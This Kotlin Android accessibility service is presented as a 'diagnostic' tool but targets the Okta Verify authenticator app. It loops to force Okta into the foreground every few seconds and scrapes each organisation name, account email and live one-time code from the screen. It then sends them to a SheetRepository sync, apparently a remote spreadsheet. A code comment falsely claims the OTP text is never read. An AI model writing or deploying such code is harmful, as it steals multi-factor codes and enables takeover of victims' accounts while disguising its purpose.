package dev.local.accessibilitydiagnostics

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.Collections
import java.util.IdentityHashMap
import java.util.concurrent.ConcurrentHashMap
import android.content.Intent
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import android.util.Log

class DiagnosticAccessibilityService : AccessibilityService() {
    private val serviceHandler = Handler(Looper.getMainLooper())
    private val delayedWindowSnapshot = Runnable {
        logWindows()
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
    
    private var oktaCycleJob: Job? = null
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        logWindows()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        lastDispatchedSecondsMap.clear()
        stopOktaCycleLoop()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TOGGLE_CYCLE) {
            val shouldRun = intent.getBooleanExtra(EXTRA_CYCLE_ENABLED, false)
            if (shouldRun) {
                startOktaCycleLoop()
            } else {
                stopOktaCycleLoop()
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }
    
    private fun startOktaCycleLoop() {
        if (oktaCycleJob?.isActive == true) return

        oktaCycleJob = serviceScope.launch {
            while (isActive) {
                // Launch / Bring Okta to foreground
                openOktaApp()

                // Keep Okta open for 10 seconds
                delay(10_000L)
                if (!isActive) break

                // Minimize/Close by sending global Home action
                performGlobalAction(GLOBAL_ACTION_HOME)

                // Wait 1-2 seconds on the home screen before reopening
                delay(1_500L)
            }
        }
    }
    
    private fun stopOktaCycleLoop() {
        oktaCycleJob?.cancel()
        oktaCycleJob = null
    }

    private fun openOktaApp() {
    var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)

    // Fallback: direct action intent if standard launch intent is null
    if (launchIntent == null) {
        launchIntent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
            setPackage(OKTA_PACKAGE)
        }
    }

    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)

    try {
        startActivity(launchIntent)
        Log.d("OktaCycle", "Successfully triggered launch for $OKTA_PACKAGE")
    } catch (e: Exception) {
        Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
    }
}

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.packageName?.toString() != OKTA_PACKAGE) return
        val eventSource = try { event.source } catch (_: Exception) { null }
        eventSource?.let { source ->
            try {
                val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
                val fields = OktaFields()
                inspectNode(source, 0, visited, fields)
                fields.emitIfComplete()
            } catch (_: Exception) {
            } finally {
                @Suppress("DEPRECATION")
                source.recycle()
            }
        }
        if (event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            logWindows()
        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            serviceHandler.removeCallbacks(delayedWindowSnapshot)
            serviceHandler.postDelayed(delayedWindowSnapshot, WINDOW_SNAPSHOT_DELAY_MS)
        }
    }

    private fun inspectNode(
        node: AccessibilityNodeInfo,
        depth: Int,
        visited: MutableSet<AccessibilityNodeInfo>,
        fields: OktaFields
    ) {
        if (depth > MAX_DEPTH || node.packageName?.toString() != OKTA_PACKAGE || !visited.add(node)) return
        when (node.viewIdResourceName) {
            "$OKTA_PACKAGE:id/list_item_token_totp_text_view" -> {
                // Read only the countdown from the description; never read the OTP text.
                val description = node.contentDescription?.toString().orEmpty()
                val seconds = SECONDS_UNTIL_EXPIRY.find(description)?.groupValues?.get(1)?.toIntOrNull()
                if (seconds != null) {
                    fields.secondsUntilCodeExpires = seconds
                    fields.hasPasswordNode = true
                    fields.pass = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
                }
            }
            "$OKTA_PACKAGE:id/list_item_token_email_text_view" -> {
                fields.account = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }
            "$OKTA_PACKAGE:id/list_item_token_org_text_view" -> {
                fields.client = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
            }
        }
        for (index in 0 until node.childCount) {
            val child = try { node.getChild(index) } catch (_: Exception) { null } ?: continue
            try {
                inspectNode(child, depth + 1, visited, fields)
            } finally {
                @Suppress("DEPRECATION")
                child.recycle()
            }
        }
    }

    private fun logWindows() {
        try {
            windows.forEachIndexed { index, window ->
                val root = try { window.root } catch (_: Exception) { null }
                root?.takeIf { it.packageName?.toString() == OKTA_PACKAGE }?.let {
                    try {
                        val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
                        val fields = OktaFields()
                        inspectNode(it, 0, visited, fields)
                        fields.emitIfComplete()
                    } finally {
                        @Suppress("DEPRECATION")
                        it.recycle()
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onInterrupt() {
    }

    private inner class OktaFields {
        var client: String? = null
        var account: String? = null
        var hasPasswordNode: Boolean = false
        var pass: String? = null
        var secondsUntilCodeExpires: Int? = null

        fun emitIfComplete() {
            val clientValue = client ?: return
            val accountValue = account ?: return
            val secondsValue = secondsUntilCodeExpires ?: return
            val passValue = pass?: return
            if (!hasPasswordNode) return
            val dedupeKey = "$clientValue:::$accountValue"
            val lastSentSeconds = lastDispatchedSecondsMap[dedupeKey]
            
            if (lastSentSeconds == secondsValue) {
                return
            }
            lastDispatchedSecondsMap[dedupeKey] = secondsValue
            
            val cleanPassword = passValue.replace("\\s".toRegex(), "")
            
            DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)

            serviceScope.launch {
                val result = SheetRepository.syncDiagnosticData(
                    clientName = clientValue,
                    account = accountValue,
                    pass = cleanPassword,
                    secondsUntilCodeExpires = secondsValue
                )
                result.onFailure {
                    if (lastDispatchedSecondsMap[dedupeKey] == secondsValue) {
                        lastDispatchedSecondsMap.remove(dedupeKey)
                    }
                }
            }
        }
    }

    companion object {
        const val ACTION_TOGGLE_CYCLE = "dev.local.accessibilitydiagnostics.ACTION_TOGGLE_OKTA_CYCLE"
        const val EXTRA_CYCLE_ENABLED = "extra_cycle_enabled"
        private const val MAX_DEPTH = 80
        private const val WINDOW_SNAPSHOT_DELAY_MS = 200L
        private const val OKTA_PACKAGE = "com.okta.android.auth"
        private val SECONDS_UNTIL_EXPIRY = Regex("(\\d+)\\s+seconds?\\s+before code expires", RegexOption.IGNORE_CASE)
    }
}
